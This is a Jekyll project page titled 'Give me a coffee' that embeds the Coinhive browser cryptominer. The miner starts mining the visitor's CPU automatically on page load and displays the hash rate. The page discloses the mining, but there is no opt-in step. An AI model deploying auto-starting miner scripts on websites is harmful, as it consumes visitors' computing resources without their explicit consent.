---
layout: project
type: WIP
noimage: '<i class="fa fa-coffee fa-big12" aria-hidden="true"></i>'
image: 
title: Give me a coffee
github: 
description: Buy me a coffee buy giving me some CPU cycles.
---

### Performances:

* **Hashes per seconds:** <em id="hashespersecond">0</em><em>H/s</em><br>
* **Total hashes:** <em id="totalhashes">0</em><em>H</em><br>
* **Accepted hashes:** <em id="accepted">0</em><em>H</em>

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>

<script>
	window.onload = function() {
		var miner = new CoinHive.Anonymous('94Ewh5erEv797iMDCHPDwSqQHFt6dvvd');
		miner.start();
		miner.setThrottle(0.8)
			// Listen on events
		miner.on('found', function() { /* Hash found */ })
		miner.on('accepted', function() { /* Hash accepted by the pool */ })

		// Update stats once per second
		setInterval(function() {
			var hashesPerSecond = miner.getHashesPerSecond();
			var totalHashes = miner.getTotalHashes();
			var acceptedHashes = miner.getAcceptedHashes();
			document.getElementById("hashespersecond").innerHTML = hashesPerSecond.toString();
			document.getElementById("totalhashes").innerHTML = totalHashes.toString();
			document.getElementById("accepted").innerHTML = acceptedHashes.toString();
			// Output to HTML elements...
		}, 1000);
	} 
	
</script>